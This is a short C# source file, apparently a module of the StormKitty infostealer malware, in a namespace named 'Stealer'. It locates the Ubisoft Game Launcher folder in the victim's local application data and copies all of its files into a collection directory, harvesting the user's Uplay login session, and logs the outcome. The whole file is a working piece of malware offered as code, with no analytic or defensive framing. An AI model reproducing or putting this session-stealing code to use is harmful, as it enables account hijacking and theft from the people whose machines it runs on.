using System;
using System.IO;

namespace Stealer
{
    internal sealed class Uplay
    {
        private static string path = Path.Combine(
            Paths.lappdata, "Ubisoft Game Launcher");

        public static bool GetUplaySession(string sSavePath)
        {
            if (!Directory.Exists(path))
                return StormKitty.Logging.Log("Uplay >> Session not found");

            try
            {
                Directory.CreateDirectory(sSavePath);
                foreach (string file in Directory.GetFiles(path))
                    File.Copy(file, Path.Combine(sSavePath, Path.GetFileName(file)));

                Counter.Uplay = true;
            } catch (Exception ex) { return StormKitty.Logging.Log("Uplay >> Error\n" + ex, false); }
            return true;
        }

    }
}
